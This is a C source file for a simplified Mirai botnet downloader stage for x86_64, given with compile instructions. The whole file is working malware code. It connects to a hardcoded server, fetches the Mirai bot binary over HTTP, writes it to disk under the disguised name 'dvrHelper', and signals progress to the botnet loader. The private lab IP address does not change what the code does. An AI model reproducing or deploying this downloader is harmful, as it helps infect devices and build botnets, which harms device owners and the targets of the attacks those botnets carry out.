/**
 * Simplified DLR for x86_64 - Downloads bot binary via HTTP
 * Compile: gcc -static -Os -o dlr.x86_64 main.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>

#define HTTP_SERVER "172.16.193.190"
#define HTTP_PORT 80

int main(int argc, char *argv[]) {
    int sock;
    struct sockaddr_in addr;
    char buffer[4096];
    FILE *fp;
    int i, found;
    ssize_t n;
    char request[256];
    
    // Signal loader that we started
    printf("MIRAI\n");
    fflush(stdout);
    
    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return 1;
    }
    
    // Setup address
    addr.sin_family = AF_INET;
    addr.sin_port = htons(HTTP_PORT);
    if (inet_pton(AF_INET, HTTP_SERVER, &addr.sin_addr) <= 0) {
        close(sock);
        return 1;
    }
    
    // Connect to HTTP server
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        printf("NIF\n");
        close(sock);
        return 1;
    }
    
    // Send HTTP GET request
    snprintf(request, sizeof(request), 
             "GET /bins/mirai.x86_64 HTTP/1.0\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n", HTTP_SERVER);
    
    if (send(sock, request, strlen(request), 0) < 0) {
        close(sock);
        return 1;
    }
    
    // Open output file
    fp = fopen("dvrHelper", "wb");
    if (!fp) {
        close(sock);
        return 1;
    }
    
    // Skip HTTP headers
    found = 0;
    char header_buf[4096];
    int header_pos = 0;
    
    while (!found) {
        n = recv(sock, buffer, sizeof(buffer), 0);
        if (n <= 0) break;
        
        // Look for \r\n\r\n header end marker
        for (i = 0; i < n - 3; i++) {
            if (buffer[i] == '\r' && buffer[i+1] == '\n' && 
                buffer[i+2] == '\r' && buffer[i+3] == '\n') {
                // Write remaining data after headers
                fwrite(buffer + i + 4, 1, n - i - 4, fp);
                found = 1;
                break;
            }
        }
    }
    
    // Continue downloading body
    if (found) {
        while ((n = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
            fwrite(buffer, 1, n, fp);
        }
    }
    
    // Cleanup
    fclose(fp);
    close(sock);
    
    // Signal loader that download is complete
    printf("FIN\n");
    fflush(stdout);
    
    return 0;
}